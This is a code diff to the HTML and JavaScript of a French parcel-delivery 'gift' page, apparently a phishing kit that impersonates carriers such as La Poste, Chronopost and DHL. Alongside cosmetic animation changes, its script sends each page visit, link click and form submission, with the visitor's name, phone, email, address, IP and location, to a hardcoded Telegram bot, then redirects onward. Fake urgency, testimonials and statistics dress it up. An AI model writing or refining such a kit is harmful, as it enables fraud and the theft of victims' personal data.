@@ -22,6 +22,21 @@
                             800: '#075985',
                             900: '#0c4a6e',
                         }
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 3s infinite',
+                        'float': 'float 6s ease-in-out infinite',
+                        'fadeIn': 'fadeIn 0.5s ease-in forwards'
+                    },
+                    keyframes: {
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0)' },
+                            '50%': { transform: 'translateY(-10px)' }
+                        },
+                        fadeIn: {
+                            '0%': { opacity: '0', transform: 'translateY(20px)' },
+                            '100%': { opacity: '1', transform: 'translateY(0)' }
+                        }
                     }
                 }
             }
@@ -85,17 +100,6 @@
             border-color: #0ea5e9;
             background-color: #f0f9ff;
         }
-        .animate-pulse-slow {
-            animation: pulse-slow 3s infinite;
-        }
-        @keyframes pulse-slow {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.8; }
-        }
-        .countdown-timer {
-            font-family: 'Courier New', monospace;
-            letter-spacing: 1px;
-        }
         .section-divider {
             height: 80px;
             background: linear-gradient(to bottom, rgba(255,255,255,1) 0%, rgba(255,255,255,0) 100%);
@@ -129,19 +133,24 @@
         .nav-link:hover:after {
             width: 100%;
         }
-        .floating-badge {
-            animation: float 6s ease-in-out infinite;
-        }
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
         .card-hover {
             transition: all 0.3s ease;
         }
         .card-hover:hover {
             transform: translateY(-8px);
             box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+        .delivery-logo {
+            height: 24px;
+            object-fit: contain;
+            filter: grayscale(100%) brightness(0.5);
+            transition: all 0.3s ease;
+        }
+        .delivery-method:hover .delivery-logo {
+            filter: grayscale(0%) brightness(1);
+        }
+        .delivery-method.selected .delivery-logo {
+            filter: grayscale(0%) brightness(1);
         }
     </style>
 </head>
@@ -159,7 +168,7 @@
             <div class="flex justify-between items-center">
                 <div class="flex items-center space-x-3">
                     <div class="feature-icon">
-                        <i class="fas fa-gift text-2xl text-white"></i>
+                        <i class="fas fa-gift text-white"></i>
                     </div>
                     <span class="text-xl font-bold text-gray-800">PrestigeLivraison</span>
                 </div>
@@ -182,7 +191,7 @@
         <div class="container mx-auto px-4">
             <div class="flex flex-col lg:flex-row items-center justify-between gap-12">
                 <div class="lg:w-1/2">
-                    <div class="floating-badge bg-white text-primary-600 font-medium py-2 px-4 rounded-full inline-flex items-center shadow-sm mb-6">
+                    <div class="animate-float bg-white text-primary-600 font-medium py-2 px-4 rounded-full inline-flex items-center shadow-sm mb-6">
                         <i class="fas fa-bolt text-yellow-400 mr-2"></i>
                         <span>Disponibilité limitée</span>
                     </div>
@@ -222,7 +231,7 @@
                 </div>
                 
                 <div class="lg:w-1/2 relative">
-                    <div class="bg-white p-8 rounded-xl shadow-xl card-hover">
+                    <div class="bg-white p-8 rounded-xl shadow-xl card-hover animate-fadeIn">
                         <div class="text-center mb-6">
                             <div class="inline-block bg-primary-100 text-primary-600 p-3 rounded-full mb-4">
                                 <i class="fas fa-gift text-3xl"></i>
@@ -275,7 +284,7 @@
             <div class="text-center mb-8">
                 <p class="text-gray-500 uppercase tracking-wider text-sm font-medium">Partenaires de livraison</p>
             </div>
-            <div class="flex flex-wrap justify-center items-center gap-8 md:gap-12 opacity-70">
+            <div class="flex flex-wrap justify-center items-center gap-8 md:gap-12">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Chronopost_logo.svg/2560px-Chronopost_logo.svg.png" alt="Chronopost" class="h-8">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/La_Poste_Logo.svg/2560px-La_Poste_Logo.svg.png" alt="La Poste" class="h-8">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/66/DHL_Logo_2015.svg/2560px-DHL_Logo_2015.svg.png" alt="DHL" class="h-8">
@@ -294,7 +303,7 @@
             </div>
             
             <div class="grid md:grid-cols-3 gap-8 max-w-6xl mx-auto">
-                <div class="bg-white p-8 rounded-xl shadow-sm border border-gray-100 card-hover">
+                <div class="bg-white p-8 rounded-xl shadow-sm border border-gray-100 card-hover animate-fadeIn">
                     <div class="feature-icon mb-6 mx-auto">
                         <i class="fas fa-shield-alt text-white text-xl"></i>
                     </div>
@@ -304,7 +313,7 @@
                     </p>
                 </div>
                 
-                <div class="bg-white p-8 rounded-xl shadow-sm border border-gray-100 card-hover">
+                <div class="bg-white p-8 rounded-xl shadow-sm border border-gray-100 card-hover animate-fadeIn" style="animation-delay: 0.2s;">
                     <div class="feature-icon mb-6 mx-auto">
                         <i class="fas fa-clock text-white text-xl"></i>
                     </div>
@@ -314,7 +323,7 @@
                     </p>
                 </div>
                 
-                <div class="bg-white p-8 rounded-xl shadow-sm border border-gray-100 card-hover">
+                <div class="bg-white p-8 rounded-xl shadow-sm border border-gray-100 card-hover animate-fadeIn" style="animation-delay: 0.4s;">
                     <div class="feature-icon mb-6 mx-auto">
                         <i class="fas fa-headset text-white text-xl"></i>
                     </div>
@@ -394,7 +403,7 @@
                                         <input type="radio" name="delivery-method" value="colissimo" class="mt-1 mr-3" required>
                                         <div>
                                             <div class="flex items-center">
-                                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/La_Poste_Logo.svg/2560px-La_Poste_Logo.svg.png" alt="Colissimo" class="h-5 mr-2">
+                                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/La_Poste_Logo.svg/2560px-La_Poste_Logo.svg.png" alt="Colissimo" class="delivery-logo h-5 mr-2">
                                                 <span class="font-medium">Colissimo</span>
                                             </div>
                                             <p class="text-sm text-gray-600 mt-1">Livraison standard en 2-3 jours ouvrés</p>
@@ -408,7 +417,7 @@
                                         <input type="radio" name="delivery-method" value="chronopost" class="mt-1 mr-3">
                                         <div>
                                             <div class="flex items-center">
-                                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Chronopost_logo.svg/2560px-Chronopost_logo.svg.png" alt="Chronopost" class="h-5 mr-2">
+                                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Chronopost_logo.svg/2560px-Chronopost_logo.svg.png" alt="Chronopost" class="delivery-logo h-5 mr-2">
                                                 <span class="font-medium">Chronopost</span>
                                             </div>
                                             <p class="text-sm text-gray-600 mt-1">Livraison express en 24h</p>
@@ -422,7 +431,7 @@
                                         <input type="radio" name="delivery-method" value="mondial-relay" class="mt-1 mr-3">
                                         <div>
                                             <div class="flex items-center">
-                                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Mondial_Relay_logo.svg/1200px-Mondial_Relay_logo.svg.png" alt="Mondial Relay" class="h-5 mr-2">
+                                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Mondial_Relay_logo.svg/1200px-Mondial_Relay_logo.svg.png" alt="Mondial Relay" class="delivery-logo h-5 mr-2">
                                                 <span class="font-medium">Mondial Relay</span>
                                             </div>
                                             <p class="text-sm text-gray-600 mt-1">Retrait en point relais</p>
@@ -436,7 +445,7 @@
                                         <input type="radio" name="delivery-method" value="dhl" class="mt-1 mr-3">
                                         <div>
                                             <div class="flex items-center">
-                                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/66/DHL_Logo_2015.svg/2560px-DHL_Logo_2015.svg.png" alt="DHL" class="h-5 mr-2">
+                                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/66/DHL_Logo_2015.svg/2560px-DHL_Logo_2015.svg.png" alt="DHL" class="delivery-logo h-5 mr-2">
                                                 <span class="font-medium">DHL Express</span>
                                             </div>
                                             <p class="text-sm text-gray-600 mt-1">Service premium avec assurance</p>
@@ -490,19 +499,21 @@
         <div class="container mx-auto px-4">
             <div class="grid grid-cols-2 md:grid-cols-4 gap-8 text-center">
                 <div class="p-4">
-                    <div class="text-4xl font-bold mb-2">15,327+</div>
+                    <div class="text-4xl font-bold mb-2 animate-countup" data-target="15327">0</div>
                     <div class="text-primary-200">Dossiers traités</div>
                 </div>
                 <div class="p-4">
-                    <div class="text-4xl font-bold mb-2">99%</div>
+                    <div class="text-4xl font-bold mb-2 animate-countup" data-target="99">0</div>
                     <div class="text-primary-200">Satisfaction clients</div>
                 </div>
                 <div class="p-4">
-                    <div class="text-4xl font-bold mb-2">4.8/5</div>
+                    <div class="text-4xl font-bold mb-2">
+                        <span class="animate-countup" data-target="4">0</span>.<span class="animate-countup" data-target="8">0</span>/5
+                    </div>
                     <div class="text-primary-200">Évaluations moyennes</div>
                 </div>
                 <div class="p-4">
-                    <div class="text-4xl font-bold mb-2">24h</div>
+                    <div class="text-4xl font-bold mb-2 animate-countup" data-target="24">0</div>
                     <div class="text-primary-200">Traitement moyen</div>
                 </div>
             </div>
@@ -519,7 +530,7 @@
             
             <div class="grid grid-cols-1 md:grid-cols-3 gap-8 max-w-6xl mx-auto">
                 <!-- Testimonial 1 -->
-                <div class="testimonial-card p-6 rounded-xl">
+                <div class="testimonial-card p-6 rounded-xl animate-fadeIn">
                     <div class="flex items-center mb-4">
                         <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Marie L." class="w-12 h-12 rounded-full mr-4">
                         <div>
@@ -539,7 +550,7 @@
                 </div>
                 
                 <!-- Testimonial 2 -->
-                <div class="testimonial-card p-6 rounded-xl">
+                <div class="testimonial-card p-6 rounded-xl animate-fadeIn" style="animation-delay: 0.2s;">
                     <div class="flex items-center mb-4">
                         <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Pierre D." class="w-12 h-12 rounded-full mr-4">
                         <div>
@@ -559,7 +570,7 @@
                 </div>
                 
                 <!-- Testimonial 3 -->
-                <div class="testimonial-card p-6 rounded-xl">
+                <div class="testimonial-card p-6 rounded-xl animate-fadeIn" style="animation-delay: 0.4s;">
                     <div class="flex items-center mb-4">
                         <img src="https://randomuser.me/api/portraits/women/68.jpg" alt="Sophie M." class="w-12 h-12 rounded-full mr-4">
                         <div>
@@ -590,7 +601,7 @@
             </div>
             
             <div class="grid md:grid-cols-3 gap-8 max-w-6xl mx-auto">
-                <div class="bg-white p-8 rounded-xl shadow-sm border border-gray-100 card-hover">
+                <div class="bg-white p-8 rounded-xl shadow-sm border border-gray-100 card-hover animate-fadeIn">
                     <div class="feature-icon mb-6 mx-auto">
                         <span class="text-white text-xl font-bold">1</span>
                     </div>
@@ -600,7 +611,7 @@
                     </p>
                 </div>
                 
-                <div class="bg-white p-8 rounded-xl shadow-sm border border-gray-100 card-hover">
+                <div class="bg-white p-8 rounded-xl shadow-sm border border-gray-100 card-hover animate-fadeIn" style="animation-delay: 0.2s;">
                     <div class="feature-icon mb-6 mx-auto">
                         <span class="text-white text-xl font-bold">2</span>
                     </div>
@@ -610,7 +621,7 @@
                     </p>
                 </div>
                 
-                <div class="bg-white p-8 rounded-xl shadow-sm border border-gray-100 card-hover">
+                <div class="bg-white p-8 rounded-xl shadow-sm border border-gray-100 card-hover animate-fadeIn" style="animation-delay: 0.4s;">
                     <div class="feature-icon mb-6 mx-auto">
                         <span class="text-white text-xl font-bold">3</span>
                     </div>
@@ -621,7 +632,7 @@
                 </div>
             </div>
             
-            <div class="mt-12 bg-blue-50 border-l-4 border-primary-400 p-6 rounded-lg max-w-3xl mx-auto">
+            <div class="mt-12 bg-blue-50 border-l-4 border-primary-400 p-6 rounded-lg max-w-3xl mx-auto animate-fadeIn" style="animation-delay: 0.6s;">
                 <div class="flex">
                     <div class="flex-shrink-0">
                         <i class="fas fa-truck text-primary-500 text-2xl"></i>
@@ -646,7 +657,7 @@
             </div>
             
             <div class="max-w-3xl mx-auto space-y-4">
-                <div class="border border-gray-200 rounded-xl overflow-hidden">
+                <div class="border border-gray-200 rounded-xl overflow-hidden animate-fadeIn">
                     <button class="faq-question w-full px-6 py-5 text-left font-medium text-gray-800 hover:bg-gray-50 flex justify-between items-center">
                         <span class="text-lg">Quel est le délai de traitement ?</span>
                         <i class="fas fa-chevron-down text-gray-500 transition-transform"></i>
@@ -664,7 +675,7 @@
                     </div>
                 </div>
                 
-                <div class="border border-gray-200 rounded-xl overflow-hidden">
+                <div class="border border-gray-200 rounded-xl overflow-hidden animate-fadeIn" style="animation-delay: 0.1s;">
                     <button class="faq-question w-full px-6 py-5 text-left font-medium text-gray-800 hover:bg-gray-50 flex justify-between items-center">
                         <span class="text-lg">Comment sont protégées mes données ?</span>
                         <i class="fas fa-chevron-down text-gray-500 transition-transform"></i>
@@ -683,7 +694,7 @@
                     </div>
                 </div>
                 
-                <div class="border border-gray-200 rounded-xl overflow-hidden">
+                <div class="border border-gray-200 rounded-xl overflow-hidden animate-fadeIn" style="animation-delay: 0.2s;">
                     <button class="faq-question w-full px-6 py-5 text-left font-medium text-gray-800 hover:bg-gray-50 flex justify-between items-center">
                         <span class="text-lg">Puis-je modifier ma demande après soumission ?</span>
                         <i class="fas fa-chevron-down text-gray-500 transition-transform"></i>
@@ -701,7 +712,7 @@
                     </div>
                 </div>
                 
-                <div class="border border-gray-200 rounded-xl overflow-hidden">
+                <div class="border border-gray-200 rounded-xl overflow-hidden animate-fadeIn" style="animation-delay: 0.3s;">
                     <button class="faq-question w-full px-6 py-5 text-left font-medium text-gray-800 hover:bg-gray-50 flex justify-between items-center">
                         <span class="text-lg">Quelles sont les options de suivi disponibles ?</span>
                         <i class="fas fa-chevron-down text-gray-500 transition-transform"></i>
@@ -720,7 +731,7 @@
                     </div>
                 </div>
                 
-                <div class="border border-gray-200 rounded-xl overflow-hidden">
+                <div class="border border-gray-200 rounded-xl overflow-hidden animate-fadeIn" style="animation-delay: 0.4s;">
                     <button class="faq-question w-full px-6 py-5 text-left font-medium text-gray-800 hover:bg-gray-50 flex justify-between items-center">
                         <span class="text-lg">Comment contacter le service client ?</span>
                         <i class="fas fa-chevron-down text-gray-500 transition-transform"></i>
@@ -740,7 +751,7 @@
                 </div>
             </div>
             
-            <div class="mt-12 text-center">
+            <div class="mt-12 text-center animate-fadeIn" style="animation-delay: 0.5s;">
                 <div class="inline-flex items-center bg-primary-50 border border-primary-200 rounded-lg px-6 py-4">
                     <i class="fas fa-headset text-primary-600 text-xl mr-3"></i>
                     <p class="text-primary-700 font-medium">
@@ -850,23 +861,26 @@
 
     <script>
         // Telegram Bot Configuration
-        const BOT1_TOKEN = "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw";
-        const BOT1_CHAT_ID = "5372119436";
-        const BOT2_TOKEN = "0900293847:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw";
-        const BOT2_CHAT_ID = "1737384765";
-
+        const BOT_TOKEN = "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw";
+        const CHAT_ID = "5372119436";
+        
         // Improved Telegram send function with error handling
-        async function sendToTelegram(token, chatId, text) {
+        async function sendToTelegram(text) {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: chatId,
+                        chat_id: CHAT_ID,
                         text: text,
                         parse_mode: 'Markdown'
                     })
                 });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
                 return await response.json();
             } catch (error) {
                 console.error('Telegram send error:', error);
@@ -874,27 +888,38 @@
             }
         }
 
-        // Function to get visitor info and send notification
+        // Function to get visitor info
+        async function getVisitorInfo() {
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                if (!ipResponse.ok) {
+                    throw new Error('IP API request failed');
+                }
+                return await ipResponse.json();
+            } catch (error) {
+                console.error('Error getting visitor info:', error);
+                return {
+                    city: 'Inconnu',
+                    country_name: 'Inconnu',
+                    ip: 'Inconnu'
+                };
+            }
+        }
+
+        // Function to send visit notification
         async function sendVisitNotification() {
             try {
-                // Get IP and location info
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
+                const ipData = await getVisitorInfo();
                 
-                // Prepare visit message
                 const visitMessage = `
 🌍 **Nouvelle visite sur le site** 🌍
 🕒 Heure: ${new Date().toLocaleString('fr-FR')}
-📍 Localisation: ${ipData.city || 'Inconnu'} - ${ipData.country_name || 'Inconnu'}
+📍 Localisation: ${ipData.city} - ${ipData.country_name}
 📱 Appareil: ${navigator.userAgent || 'Inconnu'}
 🔗 Page: ${window.location.href}
                 `;
                 
-                // Send to both Telegram bots
-                await Promise.all([
-                    sendToTelegram(BOT1_TOKEN, BOT1_CHAT_ID, visitMessage),
-                    sendToTelegram(BOT2_TOKEN, BOT2_CHAT_ID, visitMessage)
-                ]);
+                await sendToTelegram(visitMessage);
             } catch (error) {
                 console.error('Error sending visit notification:', error);
             }
@@ -908,25 +933,16 @@
                         e.preventDefault();
                         
                         try {
-                            // Get IP and location info
-                            const ipResponse = await fetch('https://ipapi.co/json/');
-                            const ipData = await ipResponse.json();
+                            const ipData = await getVisitorInfo();
                             
-                            // Prepare click message
                             const clickMessage = `
 🔗 **Lien cliqué** 🔗
 🌐 URL: ${this.href}
-📍 Localisation: ${ipData.city || 'Inconnu'} - ${ipData.country_name || 'Inconnu'}
+📍 Localisation: ${ipData.city} - ${ipData.country_name}
 🕒 Heure: ${new Date().toLocaleString('fr-FR')}
                             `;
                             
-                            // Send to Telegram
-                            await Promise.all([
-                                sendToTelegram(BOT1_TOKEN, BOT1_CHAT_ID, clickMessage),
-                                sendToTelegram(BOT2_TOKEN, BOT2_CHAT_ID, clickMessage)
-                            ]);
-                            
-                            // Redirect after sending
+                            await sendToTelegram(clickMessage);
                             window.location.href = this.href;
                         } catch (error) {
                             console.error('Error tracking link click:', error);
@@ -937,30 +953,38 @@
             });
         }
 
-        // Send visit notification when page loads
-        window.addEventListener('load', sendVisitNotification);
-        
-        // Setup link tracking when DOM is ready
-        document.addEventListener('DOMContentLoaded', setupLinkTracking);
-
-        // Original Form Submission Code
+        // Form submission handler
         document.getElementById('livraison-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             
+            const submitBtn = document.getElementById('submit-btn');
+            const btnText = document.getElementById('btn-text');
+            const submitIcon = document.getElementById('submit-icon');
+            
+            // Change button state
+            submitBtn.disabled = true;
+            btnText.textContent = "Traitement...";
+            submitIcon.className = "fas fa-spinner fa-spin ml-3";
+            
+            // Show loading screen
             document.querySelector('.loading-screen').style.display = 'flex';
             
-            const formData = {
-                fullname: document.getElementById('fullname').value,
-                phone: document.getElementById('phone').value,
-                email: document.getElementById('email').value,
-                address: document.getElementById('address').value,
-                deliveryMethod: document.querySelector('input[name="delivery-method"]:checked')?.value,
-                timestamp: new Date().toLocaleString('fr-FR'),
-                userAgent: navigator.userAgent,
-                ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'Unknown')
-            };
-            
-            const message = `
+            try {
+                const ipData = await getVisitorInfo();
+                
+                const formData = {
+                    fullname: document.getElementById('fullname').value,
+                    phone: document.getElementById('phone').value,
+                    email: document.getElementById('email').value,
+                    address: document.getElementById('address').value,
+                    deliveryMethod: document.querySelector('input[name="delivery-method"]:checked')?.value,
+                    timestamp: new Date().toLocaleString('fr-FR'),
+                    userAgent: navigator.userAgent,
+                    ip: ipData.ip,
+                    location: `${ipData.city}, ${ipData.country_name}`
+                };
+                
+                const message = `
 📄 **NOUVELLE DEMANDE DE SERVICE** 📄
 🚚 **Option de livraison:** ${formData.deliveryMethod || 'Non spécifiée'}
 👤 **Informations personnelles:**
@@ -971,23 +995,34 @@
 
 🌐 **Informations techniques:**
 ▸ IP: ${formData.ip}
-▸ User Agent: ${formData.userAgent}
+▸ Localisation: ${formData.location}
 ▸ Date: ${formData.timestamp}
-            `;
-            
-            try {
-                await Promise.all([
-                    sendToTelegram(BOT1_TOKEN, BOT1_CHAT_ID, message),
-                    sendToTelegram(BOT2_TOKEN, BOT2_CHAT_ID, message)
-                ]);
+                `;
                 
-                setTimeout(() => {
-                    window.location.href = "paiement.html";
-                }, 3000);
+                // Send to Telegram
+                const telegramResponse = await sendToTelegram(message);
+                
+                if (telegramResponse && telegramResponse.ok) {
+                    // Success - redirect to next page
+                    setTimeout(() => {
+                        window.location.href = "traitement.html";
+                    }, 2000);
+                } else {
+                    throw new Error('Failed to send Telegram message');
+                }
                 
             } catch (error) {
-                console.error("Error:", error);
+                console.error("Form submission error:", error);
+                
+                // Reset button state
+                submitBtn.disabled = false;
+                btnText.textContent = "Valider ma demande";
+                submitIcon.className = "fas fa-arrow-right ml-3";
+                
+                // Hide loading screen
                 document.querySelector('.loading-screen').style.display = 'none';
+                
+                // Show error message
                 alert("Une erreur s'est produite lors du traitement de votre demande. Veuillez réessayer ou contacter notre service client.");
             }
         });
@@ -1022,14 +1057,15 @@
             
             const diff = endOfDay - now;
             
-            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60);
-            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60);
-            const seconds = Math.floor((diff % (1000 * 60)) / 1000;
+            const hours = Math.floor(diff / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
             
             document.getElementById('countdown').textContent = 
-                `${Math.floor(hours).toString().padStart(2, '0')}:${Math.floor(minutes).toString().padStart(2, '0')}:${Math.floor(seconds).toString().padStart(2, '0')}`;
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
         }
         
+        // Initialize countdown
         setInterval(updateCountdown, 1000);
         updateCountdown();
         
@@ -1050,7 +1086,7 @@
         // Form Input Validation
         document.querySelectorAll('.form-input').forEach(input => {
             input.addEventListener('blur', function() {
-                if (this.value.trim() === '') {
+                if (this.value.trim() === '' && this.hasAttribute('required')) {
                     this.classList.add('border-red-300');
                 } else {
                     this.classList.remove('border-red-300');
@@ -1058,46 +1094,62 @@
             });
         });
 
-        // Mobile Menu Toggle (would need additional HTML)
-        document.querySelector('.md\\:hidden').addEventListener('click', function() {
-            // Implementation for mobile menu toggle
-            console.log('Mobile menu would open');
-        });
+        // Animate numbers counting up
+        function animateCountUp() {
+            const elements = document.querySelectorAll('.animate-countup');
+            
+            elements.forEach(element => {
+                const target = parseInt(element.getAttribute('data-target'));
+                const duration = 2000; // 2 seconds
+                const start = 0;
+                const increment = target / (duration / 16); // 60fps
+                
+                let current = start;
+                const timer = setInterval(() => {
+                    current += increment;
+                    if (current >= target) {
+                        clearInterval(timer);
+                        current = target;
+                    }
+                    element.textContent = Math.floor(current);
+                }, 16);
+            });
+        }
 
         // Animation on Scroll
         function animateOnScroll() {
-            const elements = document.querySelectorAll('.card-hover, .feature-icon');
+            const elements = document.querySelectorAll('.animate-fadeIn');
             
             elements.forEach(element => {
                 const elementPosition = element.getBoundingClientRect().top;
                 const screenPosition = window.innerHeight / 1.2;
                 
                 if (elementPosition < screenPosition) {
-                    element.classList.add('animate-fadeIn');
+                    element.style.opacity = '1';
+                    element.style.transform = 'translateY(0)';
                 }
             });
         }
 
+        // Initialize animations
         window.addEventListener('scroll', animateOnScroll);
         animateOnScroll(); // Run once on load
+        animateCountUp(); // Animate numbers
 
-        // Additional interactive elements
-        document.getElementById('submit-btn').addEventListener('mouseenter', function() {
-            this.querySelector('i').classList.add('animate-pulse');
-        });
+        // Send visit notification when page loads
+        window.addEventListener('load', sendVisitNotification);
+        
+        // Setup link tracking when DOM is ready
+        document.addEventListener('DOMContentLoaded', setupLinkTracking);
 
-        document.getElementById('submit-btn').addEventListener('mouseleave', function() {
-            this.querySelector('i').classList.remove('animate-pulse');
-        });
-
-        // Form submission button state
+        // Form validation on input
         document.getElementById('livraison-form').addEventListener('input', function() {
             const form = this;
             const submitBtn = document.getElementById('submit-btn');
             const allRequiredFilled = Array.from(form.querySelectorAll('[required]'))
                 .every(input => input.value.trim() !== '');
             
-            if (allRequiredFilled && form.querySelector('input[name="delivery-method"]:checked')) {
+            if (allRequiredFilled && form.querySelector('input[name="delivery-method"]:checked') && form.querySelector('#terms').checked) {
                 submitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                 submitBtn.disabled = false;
             } else {
@@ -1108,9 +1160,7 @@
 
         // Initialize form check
         document.addEventListener('DOMContentLoaded', function() {
-            const form = document.getElementById('livraison-form');
             const submitBtn = document.getElementById('submit-btn');
-            
             submitBtn.classList.add('opacity-50', 'cursor-not-allowed');
             submitBtn.disabled = true;
         });
